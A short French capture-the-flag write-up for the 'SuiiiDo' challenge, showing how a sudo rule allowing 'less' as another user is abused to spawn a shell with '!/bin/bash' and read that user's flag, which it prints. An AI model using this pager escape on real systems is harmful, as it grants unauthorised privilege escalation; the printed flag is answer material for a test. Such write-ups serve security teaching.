# SuiiiDo

Le nom du challenge fait penser à `sudo`, et dans tous les cas on a accès à rien d'autre.
Donc on tente un p'tit `sudo -l`.

```bash
user@f08f9824b2a5:~$ sudo -l
Matching Defaults entries for user on f08f9824b2a5:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on f08f9824b2a5:
    (user-cracked) NOPASSWD: /usr/bin/less /home/user-cracked/note.txt
```

Oh! On peut lancer `less` en utilisant le compte `user-cracked` !

Pour cela, on peut exécuter la commande suivante :
`sudo -u user-cracked /usr/bin/less /home/user-cracked/note.txt`

Cool. On a un ascii art de Ronaldo mais pas de flag !

Comment faire ? ---> https://gtfobins.github.io/gtfobins/less/#shell

Dans la console less, on tape :
```
!/bin/bash
```

Et hop, un shell.

On va dans notre home et on affiche le flag.

Tl;dr

```bash
user@f08f9824b2a5:~$ sudo -u user-cracked /usr/bin/less /home/user-cracked/note.txt 

user-cracked@f08f9824b2a5:/home/user$ cd ~

user-cracked@f08f9824b2a5:~$ ls
beca179417c329c2-flag-a2344ce653189f9f.txt  note.txt

user-cracked@f08f9824b2a5:~$ cat beca179417c329c2-flag-a2344ce653189f9f.txt 
NBCTF{CR7_doesnt_use_less_he_uses_m0re!}
```
